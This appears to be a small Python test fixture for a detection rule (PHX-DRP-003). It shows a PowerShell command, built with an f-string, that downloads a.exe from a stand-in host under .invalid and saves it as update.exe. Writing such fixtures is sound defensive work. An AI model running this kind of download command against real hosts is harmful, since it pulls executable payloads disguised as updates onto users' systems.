"""PHX-DRP-003 positive (ADR-028): a download command with the endpoint inside it.

The URL is one word of a PowerShell command line built as an f-string, not a literal of its
own. The host is under .invalid and cannot resolve.
"""
import subprocess

_out = "update.exe"
subprocess.run(
    ["powershell", "-Command", f'curl.exe -L https://payload.example.invalid/a.exe -o "{_out}"'],
    capture_output=True,
)
